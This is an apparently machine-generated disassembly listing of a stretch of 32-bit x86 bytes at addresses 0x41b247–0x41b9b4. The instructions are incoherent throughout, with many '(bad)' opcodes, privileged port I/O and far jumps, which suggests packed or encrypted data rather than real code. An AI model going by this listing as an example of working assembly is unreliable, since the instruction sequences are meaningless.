  41b247:	or     bl,BYTE PTR [edx+ecx*8+0x60e7d54d]
  41b24e:	popa   
  41b24f:	bound  esp,QWORD PTR [esi-0x1c2644d3]
  41b255:	(bad)  
  41b256:	sbb    BYTE PTR [ebx-0x48e89d47],al
  41b25c:	(bad)  
  41b25d:	lods   al,BYTE PTR ds:[esi]
  41b25e:	enter  0xcae0,0xc6
  41b262:	sti    
  41b263:	adc    dl,ch
  41b265:	jle    0x41b299
  41b267:	in     al,dx
  41b268:	and    al,0xd7
  41b26a:	lds    edx,FWORD PTR [ebx]
  41b26c:	dec    esp
  41b26d:	add    DWORD PTR [eax],edi
  41b26f:	mov    edi,0x5eb55ae
  41b274:	add    al,0x5b
  41b276:	sbb    BYTE PTR [ecx+0x58],cl
  41b279:	aas    
  41b27a:	int    0xef
  41b27c:	test   al,0x12
  41b27e:	sbb    bh,BYTE PTR [esp+esi*8-0x46]
  41b282:	xchg   edx,eax
  41b283:	test   eax,0xb6bad822
  41b288:	iret   
  41b289:	add    eax,0x58e3d73
  41b28e:	dec    edx
  41b28f:	test   dl,dl
  41b291:	cmp    al,0xc6
  41b293:	cs dec eax
  41b295:	out    dx,al
  41b296:	pop    DWORD PTR [eax*2-0x527c7cfe]
  41b29d:	sub    al,0x61
  41b29f:	sub    eax,0x695c5b19
  41b2a4:	hlt    
  41b2a5:	dec    edi
  41b2a6:	leave  
  41b2a7:	sub    al,0xfc
  41b2a9:	(bad)  
  41b2aa:	aad    0x5a
  41b2ac:	or     eax,0xde51b5c1
  41b2b1:	aad    0x8d
  41b2b3:	sub    BYTE PTR [ecx-0x40],ch
  41b2b6:	xchg   edx,eax
  41b2b7:	dec    esi
  41b2b8:	ins    DWORD PTR es:[edi],dx
  41b2b9:	and    eax,0xa53b7fa9
  41b2be:	xor    ecx,DWORD PTR [eax+esi*8-0xe23fb99]
  41b2c5:	cld    
  41b2c6:	mov    ebx,0xea74260a
  41b2cb:	sub    dl,BYTE PTR [esi*1+0x530ae997]
  41b2d2:	mov    dl,0x81
  41b2d4:	xchg   DWORD PTR [ecx],edi
  41b2d6:	push   cs
  41b2d7:	clc    
  41b2d8:	clc    
  41b2d9:	mov    dl,0xf9
  41b2db:	fld    QWORD PTR [ebx-0x1212adc8]
  41b2e1:	push   ss
  41b2e2:	outs   dx,BYTE PTR ds:[esi]
  41b2e3:	je     0x41b359
  41b2e5:	sbb    BYTE PTR [ebx],bh
  41b2e7:	jne    0x41b2e8
  41b2e9:	retf   
  41b2ea:	sti    
  41b2eb:	pushf  
  41b2ec:	sbb    al,0xdc
  41b2ee:	ins    DWORD PTR es:[edi],dx
  41b2ef:	mul    BYTE PTR [ebp+edi*4+0x75]
  41b2f3:	(bad)  
  41b2f4:	aam    0x57
  41b2f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2f7:	mov    bl,dh
  41b2f9:	div    DWORD PTR [esi+esi*2-0x32e1ce19]
  41b300:	mov    al,ds:0x5a1a3fcc
  41b305:	(bad)  
  41b306:	sub    edi,edx
  41b308:	call   0xae255102
  41b30d:	pop    ebx
  41b30e:	rcr    BYTE PTR [si-0x36],1
  41b312:	or     BYTE PTR [eax],dh
  41b314:	jo     0x41b2ed
  41b316:	jnp    0x41b2aa
  41b318:	inc    edi
  41b319:	mov    esp,0x12310303
  41b31e:	adc    DWORD PTR ds:0x7c8487f6,ecx
  41b324:	out    0xbf,al
  41b326:	push   ebx
  41b327:	test   BYTE PTR [ebx+ebx*2+0x6c4b9ead],bl
  41b32e:	test   eax,0xd4130d93
  41b333:	std    
  41b334:	sub    ch,BYTE PTR [ebx+esi*2+0x7c64e576]
  41b33b:	mov    ah,0x83
  41b33d:	fistp  WORD PTR [eax-0x24e189f6]
  41b343:	(bad)  
  41b344:	outs   dx,BYTE PTR ds:[esi]
  41b345:	sub    eax,0xff51c74d
  41b34a:	sub    ch,dl
  41b34c:	in     al,0x27
  41b34e:	(bad)  
  41b350:	out    0x33,al
  41b352:	sti    
  41b353:	xor    ch,BYTE PTR [edx]
  41b355:	div    DWORD PTR [ebx]
  41b357:	pop    ebx
  41b358:	jge    0x41b370
  41b35a:	mov    ds:0xd386805a,al
  41b35f:	xlat   BYTE PTR ds:[ebx]
  41b360:	outs   dx,DWORD PTR ds:[esi]
  41b361:	stos   DWORD PTR es:[edi],eax
  41b362:	inc    ecx
  41b363:	pushf  
  41b364:	shl    DWORD PTR [ecx],1
  41b366:	adc    BYTE PTR [edx],bh
  41b368:	(bad)  
  41b369:	js     0x41b3ab
  41b36b:	int    0xb4
  41b36d:	cmp    DWORD PTR [eax],edx
  41b36f:	(bad)  
  41b370:	std    
  41b371:	mov    dh,BYTE PTR [edi+0x3241406d]
  41b377:	in     al,0x22
  41b379:	xchg   ecx,eax
  41b37a:	pop    ss
  41b37b:	pusha  
  41b37c:	pop    edx
  41b37d:	leave  
  41b37e:	mov    ds:0x50376a49,eax
  41b383:	lods   al,BYTE PTR ds:[esi]
  41b384:	mov    ds:0x12c30b27,al
  41b389:	fild   WORD PTR [esi+0x2b150af5]
  41b38f:	push   esp
  41b390:	push   edi
  41b391:	push   edi
  41b392:	aaa    
  41b393:	lahf   
  41b394:	mov    edi,0x2160c785
  41b399:	sbb    eax,0xfd7a38e1
  41b39e:	adc    al,0x21
  41b3a0:	mov    esp,ebp
  41b3a2:	sub    al,0xff
  41b3a4:	jge    0x41b3fe
  41b3a6:	cmp    cl,bh
  41b3a8:	daa    
  41b3a9:	mov    ax,0x46a2
  41b3ad:	in     al,dx
  41b3ae:	adc    eax,0xd10a4334
  41b3b3:	mov    edi,0x4b4020d2
  41b3b8:	(bad)  [edi-0x25]
  41b3bb:	lahf   
  41b3bc:	gs pop esi
  41b3be:	std    
  41b3bf:	and    eax,0xde86bb19
  41b3c4:	pop    edi
  41b3c5:	call   0x52da12fc
  41b3ca:	stos   DWORD PTR es:[edi],eax
  41b3cb:	cwde   
  41b3cc:	adc    DWORD PTR [eax+edi*8-0x5b6d067],0xad7a99e4
  41b3d7:	mov    cl,0xbf
  41b3d9:	je     0x41b3c5
  41b3db:	aas    
  41b3dc:	(bad)  
  41b3dd:	in     al,dx
  41b3de:	jge    0x41b385
  41b3e0:	nop
  41b3e1:	ins    DWORD PTR es:[edi],dx
  41b3e2:	mov    ds:0x8852e2f2,al
  41b3e7:	leave  
  41b3e8:	ret    0x67fc
  41b3eb:	aad    0x73
  41b3ed:	mov    ebp,0xec97f3a8
  41b3f2:	inc    esi
  41b3f3:	into   
  41b3f4:	test   DWORD PTR [esi-0x7d],ecx
  41b3f7:	dec    ecx
  41b3f8:	ret    0xbf8d
  41b3fb:	outs   dx,DWORD PTR ds:[si]
  41b3fd:	xlat   BYTE PTR ds:[ebx]
  41b3fe:	in     al,0xa
  41b400:	pop    eax
  41b401:	aaa    
  41b402:	ret    
  41b403:	xor    BYTE PTR [eax+0x8],0xe8
  41b407:	push   es
  41b408:	cld    
  41b409:	jne    0x41b3d1
  41b40b:	sub    edi,DWORD PTR [ecx+0x31a27ba0]
  41b411:	mov    DWORD PTR [ebx],edx
  41b413:	sbb    eax,0x24036e3a
  41b418:	stos   BYTE PTR es:[edi],al
  41b419:	xchg   edx,eax
  41b41a:	stos   BYTE PTR es:[edi],al
  41b41b:	(bad)  
  41b41c:	lahf   
  41b41d:	rcl    edx,1
  41b41f:	rol    DWORD PTR [edx],cl
  41b421:	aam    0x16
  41b423:	xchg   esi,eax
  41b424:	adc    eax,0x1540b8b
  41b429:	jae    0x41b46c
  41b42b:	jp     0x41b480
  41b42d:	xchg   DWORD PTR [ebp-0x6e],ecx
  41b430:	adc    BYTE PTR [ebp+0x7570d0f4],0x55
  41b437:	into   
  41b438:	mov    bh,0x26
  41b43a:	mov    ah,BYTE PTR [esi-0x6f]
  41b43d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b43e:	fcmovbe st,st(1)
  41b440:	jns    0x41b480
  41b442:	xor    DWORD PTR [esi+ebx*4+0x75],edi
  41b446:	loope  0x41b3df
  41b448:	retf   0xf4ef
  41b44b:	push   cs
  41b44c:	dec    esi
  41b44d:	xchg   esp,eax
  41b44e:	ds push esi
  41b450:	sahf   
  41b451:	aas    
  41b452:	call   0x6328:0xba99d613
  41b459:	inc    edx
  41b45a:	cmp    ebp,DWORD PTR [edx-0x65f57166]
  41b460:	pop    ss
  41b461:	add    eax,0x4c4a3e09
  41b466:	jmp    0x184f:0x856520a9
  41b46d:	push   0xffffff93
  41b46f:	sub    BYTE PTR [ebx],dl
  41b471:	mov    eax,ds:0x64d8c956
  41b476:	inc    esi
  41b477:	fstp   DWORD PTR [eax-0x62]
  41b47a:	adc    al,0x6
  41b47c:	or     al,0x1d
  41b47e:	ins    DWORD PTR es:[edi],dx
  41b47f:	outs   dx,DWORD PTR ds:[esi]
  41b480:	or     DWORD PTR [ebp+0x58],ebp
  41b483:	aaa    
  41b484:	pushw  0x9046
  41b488:	lods   al,BYTE PTR ds:[esi]
  41b489:	mov    bl,0x1d
  41b48b:	fiadd  WORD PTR [ebx+0x68d2787f]
  41b491:	add    eax,0xc97d6404
  41b496:	jle    0x41b46c
  41b498:	aam    0x63
  41b49a:	inc    esi
  41b49b:	jg     0x41b47a
  41b49d:	jmp    0x41b43b
  41b49f:	push   0xa623aefc
  41b4a4:	arpl   WORD PTR [esi+0x41],ax
  41b4a7:	or     DWORD PTR [ebx-0x5d],0x45
  41b4ab:	sti    
  41b4ac:	mov    ds:0xe85e7efb,al
  41b4b1:	(bad)  
  41b4b3:	dec    edx
  41b4b4:	inc    eax
  41b4b5:	mov    WORD PTR [edi],es
  41b4b7:	add    DWORD PTR [eax-0x1e],edi
  41b4ba:	lahf   
  41b4bb:	test   BYTE PTR [ecx+0x52ccf11e],bh
  41b4c1:	repnz push 0x69
  41b4c4:	dec    ebp
  41b4c5:	out    0x90,eax
  41b4c7:	pushf  
  41b4c8:	cld    
  41b4c9:	xchg   BYTE PTR [eax+0x29ad4e1c],ah
  41b4cf:	and    ah,dl
  41b4d1:	scas   eax,DWORD PTR es:[edi]
  41b4d2:	iret   
  41b4d3:	xchg   ecx,eax
  41b4d4:	ret    0xc05b
  41b4d7:	or     DWORD PTR [ebp-0x58],esp
  41b4da:	mov    cl,0xd
  41b4dc:	inc    ebx
  41b4dd:	fs mov edx,0x2afab268
  41b4e3:	ds retf 0x94be
  41b4e7:	xor    BYTE PTR [ebx+0x78f62992],0x26
  41b4ee:	pop    es
  41b4ef:	inc    esi
  41b4f0:	iret   
  41b4f1:	and    eax,0x70f4c04f
  41b4f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4f7:	int    0x12
  41b4f9:	sbb    DWORD PTR [eax-0x79b678ef],ebx
  41b4ff:	mov    bl,0x4c
  41b501:	xchg   esp,eax
  41b502:	jbe    0x41b54e
  41b504:	xchg   ebx,eax
  41b505:	inc    ebx
  41b506:	aad    0x7f
  41b508:	int3   
  41b509:	(bad)  
  41b50a:	lahf   
  41b50b:	jmp    0x1b947551
  41b510:	icebp  
  41b511:	xor    DWORD PTR [ecx],eax
  41b513:	popf   
  41b514:	jle    0x41b4b1
  41b516:	sub    eax,0x8e5ca3e3
  41b51b:	popa   
  41b51c:	hlt    
  41b51d:	sub    al,0x75
  41b51f:	adc    ebp,esi
  41b521:	xchg   esi,eax
  41b522:	int    0xc0
  41b524:	sub    ch,al
  41b526:	jge    0x41b595
  41b528:	dec    edx
  41b529:	jle    0x41b4f0
  41b52b:	adc    dh,bh
  41b52d:	or     DWORD PTR [ebx],esp
  41b52f:	in     al,dx
  41b530:	(bad)  ds:0x780904a4
  41b536:	cdq    
  41b537:	dec    edi
  41b538:	cmc    
  41b539:	ficomp DWORD PTR [esi-0x4d4dd73a]
  41b53f:	sub    al,0xc8
  41b541:	or     ch,0xbd
  41b544:	(bad)  
  41b545:	jae    0x41b549
  41b547:	in     eax,dx
  41b548:	out    0xe1,al
  41b54a:	lahf   
  41b54b:	push   ebp
  41b54c:	imul   ecx,ebx,0xffffff82
  41b54f:	mov    bl,0x1f
  41b551:	aam    0x27
  41b553:	imul   ebp,DWORD PTR [eax-0x7e32871],0x98dc46cd
  41b55d:	test   BYTE PTR [ebx-0x73],dl
  41b560:	pop    esp
  41b561:	retf   0x4795
  41b564:	dec    ebp
  41b565:	or     ch,ah
  41b567:	inc    ebx
  41b568:	jnp    0x41b5bf
  41b56a:	inc    edi
  41b56b:	call   0xfe6bd9fa
  41b570:	push   ds
  41b571:	xor    al,0x15
  41b573:	fimul  DWORD PTR [eax-0x13ed7140]
  41b579:	xchg   ecx,eax
  41b57a:	or     edx,DWORD PTR [edx-0x7b]
  41b57d:	cmp    eax,0x5328b109
  41b582:	ds dec eax
  41b584:	and    ecx,0x3b
  41b587:	xchg   DWORD PTR [esi],ecx
  41b589:	pusha  
  41b58a:	cmp    al,BYTE PTR [edi+0x977c5cf]
  41b590:	inc    edi
  41b591:	repz xchg esi,eax
  41b593:	test   eax,0xb54f3a23
  41b599:	xchg   esp,eax
  41b59a:	mov    edx,DWORD PTR [eax*8+0x56e421f7]
  41b5a1:	call   0x8a41:0x2124d356
  41b5a8:	stc    
  41b5a9:	dec    edx
  41b5aa:	sbb    edx,ecx
  41b5ac:	push   0x1e
  41b5ae:	or     BYTE PTR [ebp+0x2d],dl
  41b5b1:	push   ds
  41b5b2:	push   esi
  41b5b3:	cld    
  41b5b4:	adc    esp,DWORD PTR [edx-0x19a3415f]
  41b5ba:	jbe    0x41b595
  41b5bc:	or     al,BYTE PTR [ecx]
  41b5be:	adc    esp,0x607416bd
  41b5c4:	push   eax
  41b5c5:	jecxz  0x41b58c
  41b5c7:	adc    DWORD PTR [edx],esp
  41b5c9:	dec    edx
  41b5ca:	shl    DWORD PTR ds:0x14f5ccc2,0xa1
  41b5d1:	xor    ah,BYTE PTR ds:0x743c37f
  41b5d7:	fimul  WORD PTR ds:0xc25e6afb
  41b5dd:	lea    eax,[edi]
  41b5df:	retf   0x2944
  41b5e2:	bound  ebp,QWORD PTR [ebx]
  41b5e4:	stos   DWORD PTR es:[edi],eax
  41b5e5:	mov    esi,0xc093775b
  41b5ea:	and    eax,0x2844830
  41b5f0:	adc    ebx,DWORD PTR [ebx+0x184fb5cd]
  41b5f6:	and    ah,ah
  41b5f8:	(bad)  
  41b5fa:	div    DWORD PTR [edx+ebx*4-0x35845c6]
  41b601:	or     ah,BYTE PTR [ebx-0x5e]
  41b604:	and    BYTE PTR [ecx],dl
  41b606:	punpcklwd mm7,mm1
  41b609:	xchg   BYTE PTR [edi],ah
  41b60b:	mov    ah,BYTE PTR [edx-0x7d807aff]
  41b611:	lods   eax,DWORD PTR ds:[esi]
  41b612:	push   esi
  41b613:	pop    ds
  41b614:	scas   al,BYTE PTR es:[edi]
  41b615:	mov    ah,0x7a
  41b617:	jnp    0x41b624
  41b619:	sbb    al,0x50
  41b61b:	or     eax,0xf0fad16
  41b620:	clc    
  41b621:	push   ss
  41b622:	gs stos DWORD PTR es:[edi],eax
  41b624:	test   bl,dh
  41b626:	hlt    
  41b627:	mov    cl,0x3
  41b629:	int    0x55
  41b62b:	bound  ecx,QWORD PTR [eax]
  41b62d:	(bad)  
  41b62e:	lahf   
  41b62f:	enter  0x7bed,0xae
  41b633:	cmp    al,0x5e
  41b635:	retf   
  41b636:	mov    ds:0xcffd3bf2,eax
  41b63b:	dec    ebx
  41b63c:	fnstcw WORD PTR [ecx+0x1ac67a77]
  41b642:	mov    esi,0x4d61de9a
  41b647:	sbb    al,0x9d
  41b649:	cld    
  41b64a:	jecxz  0x41b668
  41b64c:	sbb    DWORD PTR [ecx+esi*4-0x3316a77e],ebp
  41b653:	or     eax,DWORD PTR [ecx+0x7784a72e]
  41b659:	sahf   
  41b65a:	fs retf 
  41b65c:	or     cl,cl
  41b65e:	jns    0x41b646
  41b660:	retf   
  41b661:	mov    ds:0x4df45f59,al
  41b666:	xlat   BYTE PTR ds:[ebx]
  41b667:	shr    bl,1
  41b669:	or     eax,0x5a4a1ec9
  41b66e:	(bad)  
  41b66f:	daa    
  41b670:	out    0x38,eax
  41b672:	in     eax,0x8
  41b674:	cmp    dl,dl
  41b676:	repnz out dx,al
  41b678:	dec    ebx
  41b679:	cdq    
  41b67a:	jl     0x41b65a
  41b67c:	ret    
  41b67d:	arpl   bp,di
  41b67f:	fadd   QWORD PTR [edx]
  41b681:	push   edx
  41b682:	xchg   edx,eax
  41b683:	push   ebp
  41b684:	cmc    
  41b685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b686:	mov    DWORD PTR [si-0x815],esi
  41b68b:	mov    ds:0xd7ad62be,al
  41b690:	jns    0x41b6f9
  41b692:	mov    ch,0xe0
  41b694:	jnp    0x41b6c6
  41b696:	popf   
  41b697:	mov    dl,0x8a
  41b699:	repz loopne 0x41b638
  41b69c:	jbe    0x41b6af
  41b69e:	mov    al,0xff
  41b6a0:	scas   eax,DWORD PTR es:[edi]
  41b6a1:	or     cl,ch
  41b6a3:	jl     0x41b6fe
  41b6a5:	or     dl,BYTE PTR [ebx]
  41b6a7:	jae    0x41b716
  41b6a9:	sbb    cl,BYTE PTR [edx]
  41b6ab:	add    BYTE PTR [edi-0x45],al
  41b6ae:	scas   eax,DWORD PTR es:[edi]
  41b6af:	mov    bl,0x3c
  41b6b1:	(bad)  
  41b6b3:	sti    
  41b6b4:	sbb    esp,DWORD PTR [edx-0x27]
  41b6b7:	xor    BYTE PTR ds:0x16943165,bl
  41b6bd:	leave  
  41b6be:	in     al,0xda
  41b6c0:	ja     0x41b6e3
  41b6c2:	fmul   DWORD PTR [ebx+0x1c]
  41b6c5:	inc    esp
  41b6c6:	fs jne 0x41b6b3
  41b6c9:	jg     0x41b68e
  41b6cb:	pop    esp
  41b6cc:	add    DWORD PTR ds:0x22955201,ecx
  41b6d2:	jns    0x41b6e9
  41b6d4:	fdiv   QWORD PTR [ebp-0x12f1b9a]
  41b6da:	jne    0x41b6b8
  41b6dc:	lods   al,BYTE PTR ds:[esi]
  41b6dd:	aad    0x85
  41b6df:	adc    DWORD PTR [ebx+0x392f542f],edi
  41b6e5:	clc    
  41b6e6:	es (bad) 
  41b6e8:	mov    dl,0xe1
  41b6ea:	js     0x41b741
  41b6ec:	mov    dl,0x12
  41b6ee:	xor    eax,0x1fdef2e0
  41b6f3:	inc    edi
  41b6f4:	adc    DWORD PTR [ebx-0x52ede92],ecx
  41b6fa:	imul   edx,DWORD PTR [eax-0x2ac761c1],0x746a55e3
  41b704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b705:	fisubr WORD PTR [ebp-0x1d]
  41b708:	fld    st(7)
  41b70a:	mov    ah,0x60
  41b70c:	mov    eax,0xbb8413a7
  41b711:	lahf   
  41b712:	and    DWORD PTR [edi+0x3a],ecx
  41b715:	xchg   edx,eax
  41b716:	aaa    
  41b717:	mov    DWORD PTR [ebp-0x57],edx
  41b71a:	mov    BYTE PTR [edi+0x7e],bl
  41b71d:	xchg   ecx,eax
  41b71e:	out    dx,al
  41b71f:	(bad)  
  41b720:	in     al,dx
  41b721:	dec    edi
  41b722:	add    eax,0x8f0ab33
  41b727:	retf   
  41b728:	cwde   
  41b729:	mov    ah,0x18
  41b72b:	cmp    ch,dl
  41b72d:	jecxz  0x41b782
  41b72f:	sar    BYTE PTR ds:[edx+edi*4+0x3d],0xc1
  41b735:	outs   dx,BYTE PTR ds:[esi]
  41b736:	adc    al,0x92
  41b738:	or     DWORD PTR [ebx+0x6d5fd6a8],ecx
  41b73e:	xchg   DWORD PTR [ebx-0x42ed7289],eax
  41b744:	inc    esi
  41b745:	push   cs
  41b746:	pop    ebx
  41b747:	cmp    DWORD PTR [edi+0x16],edx
  41b74a:	adc    esi,DWORD PTR [esi]
  41b74c:	popf   
  41b74d:	or     edx,DWORD PTR ds:0xf6124a95
  41b753:	push   edi
  41b754:	xchg   edi,eax
  41b755:	push   ecx
  41b756:	mov    edx,0x6d3748a6
  41b75b:	xor    DWORD PTR [bp-0x4251],eax
  41b760:	jle    0x41b746
  41b762:	sub    dh,BYTE PTR [edi+0x1a]
  41b765:	jo     0x41b71d
  41b767:	cld    
  41b768:	jbe    0x41b756
  41b76a:	cmp    DWORD PTR [edi-0x7e26eeba],eax
  41b770:	xor    dh,0xb2
  41b773:	imul   esp,DWORD PTR [edx],0xffffffc7
  41b776:	sti    
  41b777:	dec    ebx
  41b778:	aam    0x42
  41b77a:	fsubr  DWORD PTR [ebx-0x41]
  41b77d:	sub    al,0x36
  41b77f:	leave  
  41b780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b781:	and    eax,0x99c9d420
  41b786:	(bad)  [esi+0x38]
  41b789:	mov    bl,0xcc
  41b78b:	test   al,0x2b
  41b78d:	cmp    edi,edx
  41b78f:	(bad)  
  41b790:	in     eax,dx
  41b791:	out    0xa,eax
  41b793:	clc    
  41b794:	mov    WORD PTR [esi-0x63],?
  41b797:	in     al,0x46
  41b799:	pushf  
  41b79a:	cli    
  41b79b:	(bad)  
  41b79c:	sub    al,0x8e
  41b79e:	enter  0xa99a,0x48
  41b7a2:	pop    esp
  41b7a3:	jecxz  0x41b7dc
  41b7a5:	dec    ebx
  41b7a6:	call   0xd422:0x28ef45b6
  41b7ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7ae:	inc    ebx
  41b7af:	sbb    ah,BYTE PTR [esi+0x337744e8]
  41b7b5:	sbb    eax,0x9279560c
  41b7ba:	cdq    
  41b7bb:	std    
  41b7bc:	retf   0xb1c2
  41b7bf:	icebp  
  41b7c0:	sub    DWORD PTR [edi+0x4c],ebx
  41b7c3:	hlt    
  41b7c4:	adc    al,0xea
  41b7c6:	ffreep st(3)
  41b7c8:	in     al,0xf1
  41b7ca:	add    al,0x7c
  41b7cc:	lods   eax,DWORD PTR ds:[esi]
  41b7cd:	dec    ebx
  41b7ce:	mov    ds:0x8561b690,al
  41b7d3:	add    cl,bl
  41b7d5:	dec    esi
  41b7d6:	stos   DWORD PTR es:[edi],eax
  41b7d7:	repnz es hlt 
  41b7da:	inc    esi
  41b7db:	fld    st(2)
  41b7dd:	mov    ebx,0x1d27f00c
  41b7e2:	add    al,0x93
  41b7e4:	sbb    eax,0x2b7ee2
  41b7e9:	repz sbb ebp,esp
  41b7ec:	in     al,0x9
  41b7ee:	test   al,0x51
  41b7f0:	out    0xf,eax
  41b7f2:	cmp    eax,0xbbab0bd9
  41b7f7:	and    dh,ah
  41b7f9:	mov    ch,0x57
  41b7fb:	sahf   
  41b7fc:	jbe    0x41b7d0
  41b7fe:	scas   al,BYTE PTR es:[edi]
  41b7ff:	xchg   DWORD PTR [edx+0x53],ebx
  41b802:	pop    ebp
  41b803:	add    dl,BYTE PTR [ebx+0x35bd0fd3]
  41b809:	mov    ah,0x26
  41b80b:	ret    0x9dc0
  41b80e:	daa    
  41b80f:	aam    0x8c
  41b811:	xchg   esp,eax
  41b812:	pusha  
  41b813:	dec    eax
  41b814:	(bad)  
  41b815:	adc    bh,bl
  41b817:	xchg   DWORD PTR [eax+edx*4],ebx
  41b81a:	popa   
  41b81b:	mov    dh,0xf3
  41b81d:	mov    cl,0x42
  41b81f:	push   cs
  41b820:	jl     0x41b856
  41b822:	add    esp,DWORD PTR [edx+0x14ce62c7]
  41b828:	mov    dh,0xf9
  41b82a:	add    bl,BYTE PTR [ebp+0x5f03725a]
  41b830:	sbb    BYTE PTR [eax-0x2b],0x1a
  41b834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b835:	and    edi,DWORD PTR ss:[ebx-0x2ebaf7c4]
  41b83c:	dec    esi
  41b83d:	mov    eax,ds:0xb914be25
  41b842:	in     eax,0x48
  41b844:	ins    BYTE PTR es:[edi],dx
  41b845:	adc    al,0x80
  41b847:	inc    edx
  41b848:	imul   esi,DWORD PTR [edx+0x29],0x9888fb12
  41b84f:	ja     0x41b85b
  41b851:	mov    cl,0x45
  41b853:	stos   BYTE PTR es:[edi],al
  41b854:	rcr    BYTE PTR [ebx],1
  41b856:	or     al,0xbc
  41b858:	xor    DWORD PTR ds:0x48667681,ecx
  41b85e:	std    
  41b85f:	xor    bh,ch
  41b861:	aam    0x1d
  41b863:	pop    esi
  41b864:	fs push ebx
  41b866:	fnsetpm(287 only) 
  41b868:	loope  0x41b807
  41b86a:	shl    DWORD PTR [esi+0x2a],1
  41b86d:	lods   al,BYTE PTR ds:[esi]
  41b86e:	int3   
  41b86f:	add    BYTE PTR [edx],0x98
  41b872:	push   es
  41b873:	les    ecx,FWORD PTR [ebx+0x5b]
  41b876:	xor    BYTE PTR [eax+0x43],al
  41b879:	push   ds
  41b87a:	fbstp  TBYTE PTR [ecx-0x72205557]
  41b880:	outs   dx,BYTE PTR ds:[esi]
  41b881:	jecxz  0x41b8a1
  41b883:	xchg   esi,eax
  41b884:	outs   dx,DWORD PTR ds:[esi]
  41b885:	pop    ecx
  41b886:	cmp    DWORD PTR ds:0xe65e8344,esp
  41b88c:	mov    ds:0xc4b7a4b,eax
  41b891:	jmp    0x3bb78cfe
  41b896:	add    dl,BYTE PTR [eax]
  41b898:	push   es
  41b899:	je     0x41b85f
  41b89b:	lea    edx,[ebx]
  41b89d:	dec    eax
  41b89e:	mov    esp,0xd1d0dc21
  41b8a3:	icebp  
  41b8a4:	in     al,dx
  41b8a5:	in     eax,dx
  41b8a6:	ror    cl,0x11
  41b8a9:	pop    edx
  41b8aa:	lods   al,BYTE PTR ds:[esi]
  41b8ab:	mov    ds,ebp
  41b8ad:	push   esi
  41b8ae:	add    BYTE PTR [edx+0x2410b2b4],dh
  41b8b4:	pop    es
  41b8b5:	mov    ebx,0xe0643736
  41b8ba:	dec    edi
  41b8bb:	jmp    0xd3cd:0x8508ee4e
  41b8c2:	shl    dh,0xee
  41b8c5:	push   0xffffff80
  41b8c7:	pusha  
  41b8c8:	es xchg edx,eax
  41b8ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8cb:	mov    ds:0xc078d6c,al
  41b8d0:	add    eax,0x30f3d324
  41b8d5:	jnp    0x41b875
  41b8d7:	sti    
  41b8d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8d9:	fadd   st,st(3)
  41b8db:	push   edi
  41b8dc:	sub    eax,ecx
  41b8de:	nop
  41b8df:	mov    bh,0x5f
  41b8e1:	(bad)  
  41b8e3:	mov    edi,0x99cd9615
  41b8e8:	xchg   ecx,eax
  41b8e9:	mov    ds:0x9be588f7,al
  41b8ee:	jle    0x41b8ac
  41b8f0:	rol    esp,cl
  41b8f2:	cld    
  41b8f3:	int3   
  41b8f4:	hlt    
  41b8f5:	xchg   DWORD PTR [esp+esi*2-0x2d],ecx
  41b8f9:	or     dh,cl
  41b8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8fc:	ins    DWORD PTR es:[edi],dx
  41b8fd:	jl     0x41b8d5
  41b8ff:	xor    dl,BYTE PTR ds:0xaaee3bb5
  41b905:	clc    
  41b906:	or     eax,0xd7368b22
  41b90b:	dec    esp
  41b90c:	into   
  41b90d:	dec    ebx
  41b90e:	in     ax,dx
  41b910:	mov    ss,esi
  41b912:	sbb    al,0x48
  41b914:	or     bh,BYTE PTR [eax]
  41b916:	fistp  WORD PTR [edi-0x7e]
  41b919:	push   ds
  41b91a:	sub    eax,DWORD PTR [ebx+0x9ac044c]
  41b920:	out    dx,eax
  41b921:	in     eax,0x4d
  41b923:	pop    eax
  41b924:	and    BYTE PTR [eax],dh
  41b926:	mov    edx,0xdf054c57
  41b92b:	cs mov ebx,0x92998e6e
  41b931:	jecxz  0x41b996
  41b933:	inc    ebp
  41b934:	dec    ecx
  41b935:	dec    ebx
  41b936:	push   cs
  41b937:	add    DWORD PTR [edi],edi
  41b939:	push   ss
  41b93a:	push   bp
  41b93c:	xor    BYTE PTR [eax],al
  41b93e:	mov    BYTE PTR [esi+ebp*1-0x3de9e325],ah
  41b945:	mov    bl,0xa1
  41b947:	adc    BYTE PTR ds:[edx-0x41],ah
  41b94b:	into   
  41b94c:	and    eax,0xcc0d1620
  41b951:	nop
  41b952:	mov    eax,0x2d2abc66
  41b957:	sub    al,0xaf
  41b959:	pop    edx
  41b95a:	jmp    0x41b992
  41b95c:	push   ecx
  41b95d:	test   al,0x3
  41b95f:	lods   eax,DWORD PTR ds:[esi]
  41b960:	call   edx
  41b962:	aam    0x3a
  41b964:	fmul   QWORD PTR [ebp+0x5]
  41b967:	pushf  
  41b968:	and    edi,DWORD PTR [eax+0x386ff61c]
  41b96e:	sbb    eax,0x8301bd35
  41b973:	dec    eax
  41b974:	and    eax,0x26887aa8
  41b979:	scas   eax,DWORD PTR es:[edi]
  41b97a:	cmp    al,BYTE PTR [esi]
  41b97c:	jb     0x41b946
  41b97e:	rcl    ah,cl
  41b980:	dec    eax
  41b981:	or     eax,ecx
  41b983:	add    eax,0xad97353
  41b988:	jb     0x41b980
  41b98a:	mov    esp,0x56fb90e6
  41b98f:	lds    eax,FWORD PTR [ebp-0x18]
  41b992:	xchg   BYTE PTR [ecx],bh
  41b994:	std    
  41b995:	pop    ebp
  41b996:	jne    0x41b9e1
  41b998:	push   es
  41b999:	or     ah,BYTE PTR [ebx]
  41b99b:	shl    DWORD PTR cs:[bx+di],1
  41b99f:	push   esi
  41b9a0:	and    dl,ah
  41b9a2:	mov    ah,0x8b
  41b9a4:	loop   0x41b985
  41b9a6:	not    DWORD PTR [ebx+ecx*2]
  41b9a9:	cs dec esp
  41b9ab:	and    dh,BYTE PTR [eax]
  41b9ad:	xchg   ecx,eax
  41b9ae:	cmp    DWORD PTR [edi+0xd3fa56f],ebx
  41b9b4:	into   
